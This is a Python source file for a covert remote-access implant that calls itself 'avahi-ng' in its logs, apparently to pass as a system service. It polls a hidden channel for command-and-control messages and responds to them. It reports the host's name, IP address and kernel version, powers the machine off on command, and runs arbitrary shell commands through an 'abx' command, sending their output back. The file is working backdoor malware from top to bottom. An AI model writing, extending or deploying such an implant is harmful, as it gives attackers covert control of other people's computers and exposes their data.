#!/usr/bin/python3
import subprocess

from scapy.arch import get_if_addr
from scapy.config import conf

import channel
import threading
import sys
import time
import platform
import bitarray
import logging
import os

logging.basicConfig(level=logging.DEBUG)
logging.info("Starting avahi-ng...")
rx = channel.Receiver()
rx_thread = threading.Thread(target=rx.start)
if len(sys.argv) <2 or sys.argv[1] != "nocap":
    rx_thread.start()
    logging.debug("launched rx thread")


def generate_id():
    # Generate a reproducible 4 char ID for this system
    a = bitarray.bitarray()
    a.frombytes(bytes(platform.freedesktop_os_release()["NAME"], "utf-8"))
    b = bitarray.bitarray()
    b.frombytes(bytes(platform.node(), "utf-8"))
    while len(a) > len(b):
        b.append(0)
    while len(a) < len(b):
        a.append(0)
    c = a ^ b
    c.reverse()
    d = c ^ b
    d = d.tobytes().hex()
    while len(d) < 4:
        d += "1"
    if len(d) > 4:
        d = d[0:4]
    return d


id = generate_id()
logging.info("system ID is {}".format(id))


def handle_ping():
    send("ok")
    logging.info("ping")


def send_info():
    resp = platform.node()+" "+get_if_addr(conf.iface)+" "+platform.uname()["release"]
    send(resp)
    pass


def burn():
    # Uninstall agent
    logging.error("Not yet implimented!")
    pass


def arbitrary_exec(command: str):
    logging.info("running command {}".format(command))
    cmd = command.split(" ")
    send(subprocess.check_output(cmd))
    pass


def send(payload: str):
    payload = "r" + id + payload
    tmp = channel.Message(payload)
    tmp.send()


def communicate():
    global rx
    """Handle communications with C2"""
    for i in rx.messages:
        if i.finalized and i.payload[0] == "c" and (i.payload[1:5] == id or i.payload[1:5] == "0000"):
            logging.debug("got new command message: {}".format(i.payload))
            rx.tlock.acquire()
            rx.messages.remove(i)
            rx.tlock.release()
            load: str
            load = i.payload[5:]
            match load.split(":")[0]:
                case "ping":
                    handle_ping()
                case "info":
                    send_info()
                case "burnit":
                    burn()
                case "shutdown":
                    os.system("poweroff")
                case "abx":
                    arbitrary_exec(load[3:])
                case _:
                    logging.error("Bad command: {}".format(load))

while True:
    time.sleep(0.5)
    communicate()
